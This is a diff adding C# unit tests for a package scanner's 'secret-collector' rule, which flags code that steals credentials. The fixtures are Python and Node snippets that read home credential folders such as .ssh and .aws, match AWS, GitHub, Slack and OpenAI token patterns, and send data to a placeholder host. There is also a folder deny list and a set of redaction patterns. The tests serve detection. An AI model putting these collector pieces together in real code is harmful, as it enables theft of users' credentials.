@@ -1240,6 +1240,62 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Equal("1 of 2 modules compiled only, without .py source: tool.core; runs without asking: setup.py imports tool.core", f.Detail);
     }
 
+    private const string SecretShapes = "import re\nPATTERNS = [re.compile(r'AKIA[0-9A-Z]{16}'), re.compile(r'ghp_[a-zA-Z0-9]{36}')]\n";
+    private const string HomeFolders = "from pathlib import Path\nDIRS = [Path.home() / d for d in ['.ssh', '.aws', '.kube']]\nFILES = [p.read_bytes() for d in DIRS for p in d.rglob('*')]\n";
+    private const string Send = "import urllib.request\ndef send(data):\n    urllib.request.urlopen(urllib.request.Request('https://example.invalid/u', data=data))\n";
+
+    private static IEnumerable<PackageFinding> Collector(string js, bool install = false) =>
+        PackageReview.Scan("index.js", js, install, default, peel: false).Where(f => f.Rule == "package/secret-collector");
+
+    private static string NodeCollector(string pattern, string folders = "['.ssh', '.aws', '.docker']") =>
+        $"const os = require('os'), fs = require('fs'), path = require('path'), https = require('https');\nconst PATTERNS = [{pattern}];\n" +
+        $"const dirs = {folders}.map(d => path.join(os.homedir(), d));\nfor (const d of dirs) for (const f of fs.readdirSync(d)) fs.readFileSync(path.join(d, f));\n" +
+        "https.request({ host: 'example.invalid' });\n";
+
+    [Fact]
+    public void An_imported_module_with_token_patterns_home_credential_folders_and_a_send_is_noteworthy()
+    {
+        var r = Review(Zip("tool-1.0-py3-none-any.whl", Wheel(("tool/__init__.py", U("from . import _core\n")), ("tool/_core.py", U(SecretShapes + HomeFolders + Send)))));
+        Assert.Contains(r.Findings, f => f is { Rule: "package/secret-collector", Level: "noteworthy", Path: "tool/_core.py" });
+    }
+
+    [Fact]
+    public void A_secret_scanner_without_a_send_or_a_folder_list_without_token_patterns_is_not_a_secret_collector()
+    {
+        var scanner = Review(Zip("tool-1.0-py3-none-any.whl", Wheel(("tool/__init__.py", U("")), ("tool/scan.py", U(SecretShapes + HomeFolders)))));
+        Assert.DoesNotContain(scanner.Findings, f => f.Rule == "package/secret-collector");
+        var backup = Review(Zip("tool-1.0-py3-none-any.whl", Wheel(("tool/__init__.py", U("")), ("tool/sync.py", U(HomeFolders + Send)))));
+        Assert.DoesNotContain(backup.Findings, f => f.Rule == "package/secret-collector");
+    }
+
+    [Fact]
+    public void Node_code_that_reads_home_credential_folders_with_published_token_pattern_forms_is_noteworthy()
+    {
+        string[] patterns = ["/AKIA[A-Z0-9]{16}/", "/(?:A3T[A-Z0-9]|AKIA|ASIA)[A-Z0-9]{16}/", "/gh[pousr]_[A-Za-z0-9]{36}/", "/xox[baprs]-[0-9a-zA-Z]{10,48}/", "/sk-proj-[A-Za-z0-9_-]{20,}/"];
+        foreach (var pattern in patterns)
+            Assert.Contains(Collector(NodeCollector(pattern)), f => f.Level == "noteworthy");
+        Assert.Contains(Collector(NodeCollector(patterns[0]).Replace("os.homedir()", "process.env.HOME", StringComparison.Ordinal)), f => f.Level == "noteworthy");
+    }
+
+    [Fact]
+    public void A_bundle_with_a_folder_deny_list_redaction_patterns_and_an_update_check_is_not_a_noteworthy_secret_collector()
+    {
+        const string bundle = "const os = require('os');\nconst DENY = ['.ssh', '.aws', '.gnupg', '.kube', '.docker'];\n" +
+                              "const REDACT = [/AKIA[0-9A-Z]{16}/g, /ghp_[A-Za-z0-9]{36}/g, /sk-[a-zA-Z0-9]{20,}/g];\n" +
+                              "const home = os.homedir();\nawait fetch('https://example.invalid/latest');\n";
+        Assert.Empty(Collector(bundle));
+        var read = bundle + "require('fs').readFileSync('settings.json');\n" + new string(' ', 70_000);
+        Assert.All(Collector(read), f => Assert.Equal("review", f.Level));
+    }
+
+    [Fact]
+    public void Credential_folders_nine_entries_apart_or_in_separate_statements_are_not_a_folder_list()
+    {
+        var nine = string.Join(", ", Enumerable.Range(0, 9).Select(i => $"'.cache{i}'"));
+        Assert.Empty(Collector(NodeCollector("/AKIA[A-Z0-9]{16}/", $"['.ssh', {nine}, '.aws']")));
+        Assert.Empty(Collector(NodeCollector("/AKIA[A-Z0-9]{16}/", "['.ssh'].concat(['.cache']).concat(['.aws'])")));
+    }
+
     [Fact]
     public void A_wheel_that_ships_source_beside_its_bytecode_cache_has_no_compiled_only_finding()
     {
